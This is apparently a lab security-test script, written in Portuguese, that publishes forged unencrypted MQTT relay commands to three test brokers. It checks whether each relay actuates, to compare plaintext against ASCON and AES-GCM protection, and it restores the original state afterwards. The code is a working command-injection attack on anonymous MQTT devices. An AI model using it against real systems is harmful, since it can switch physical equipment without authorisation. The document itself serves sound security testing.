#!/usr/bin/env python3
"""
relay_inject.py — Injeção de comando de relé (PLAINTEXT, sem cifra) nas 3 fases.

Demonstra o controlo de INTEGRIDADE (MITRE ATT&CK T1565 / command injection). Publica um
comando forjado NÃO cifrado no tópico <FASE>/<MAC>/comando de cada relé e observa o efeito
real (lido por HTTP no web UI :80 do relé, que mostra o estado em plaintext nas 3 fases):

  - Alpha  (plaintext)   -> o relé ATUA          => injeção ACEITE   (VULNERÁVEL)
  - Bravo  (ASCON-128)   -> decrypt falha, nada  => injeção REJEITADA (SEGURO)
  - Charlie(AES-128-GCM) -> decrypt falha, nada  => injeção REJEITADA (SEGURO)

Injeta o OPOSTO do estado atual (para forçar mudança visível se aceite) e no fim RESTAURA.
Corre de um host que alcance os brokers :1883 e os relés :80. Brokers sem auth (anónimo).
"""
import json, time, urllib.request, re
import paho.mqtt.client as mqtt

# (fase, broker EMQX, IP do relé, MAC, prefixo de tópico)
T = [
    ("Alpha",   "192.168.100.100", "192.168.100.13", "CC8DA20C7AF8", "ALPHA"),
    ("Bravo",   "192.168.20.100",  "192.168.20.13",  "DCB4D90B5258", "BRAVO"),
    ("Charlie", "192.168.30.100",  "192.168.30.13",  "CC8DA20CE224", "CHARLIE"),
]

def state(ip):
    """Estado real do relé via web UI (1=LIGADO, 0=DESLIGADO, None=erro)."""
    try:
        h = urllib.request.urlopen(f"http://{ip}/", timeout=6).read().decode(errors="ignore")
        m = re.search(r"relay-state[^>]*>(LIGADO|DESLIGADO)", h)
        return 1 if (m and m.group(1) == "LIGADO") else 0 if m else None
    except Exception:
        return None

def inject(broker, phase, mac, on):
    payload = json.dumps({"command": "relay_on" if on else "relay_off"})  # forjado, SEM cifra
    c = mqtt.Client()
    c.connect(broker, 1883, 5)
    c.publish(f"{phase}/{mac}/comando", payload, qos=1)
    c.loop(timeout=1.0); c.disconnect()

print("\n>>> Injeção de comando de relé PLAINTEXT (sem cifra/assinatura)\n")
print(f"{'Fase':8} {'antes':>8} {'injeta':>8} {'depois':>8}   veredicto")
print("-" * 66)
results = []
for name, broker, ip, mac, ph in T:
    before = state(ip)
    if before is None:
        print(f"{name:8} {'ERRO':>8}  (relé {ip} sem resposta)"); continue
    target = 0 if before == 1 else 1          # o oposto
    inject(broker, ph, mac, target)
    time.sleep(3)
    after = state(ip)
    if after == target:
        verd = "ATUOU      -> injeção ACEITE  (VULNERÁVEL)"
    elif after == before:
        verd = "sem mudança -> injeção REJEITADA (SEGURO)"
    else:
        verd = f"inesperado (antes={before} depois={after})"
    print(f"{name:8} {'LIGADO' if before else 'DESLIGADO':>8} "
          f"{'relay_on' if target else 'relay_off':>8} "
          f"{'LIGADO' if after==1 else 'DESLIGADO' if after==0 else after:>8}   {verd}")
    results.append((name, broker, ph, mac, before, after))

# Restaura o estado original (Alpha volta atrás; Bravo/Charlie ignoram — já rejeitaram)
for name, broker, ph, mac, before, after in results:
    if after != before:
        inject(broker, ph, mac, before)
print("\n(estado original restaurado onde a injeção teve efeito)\n")
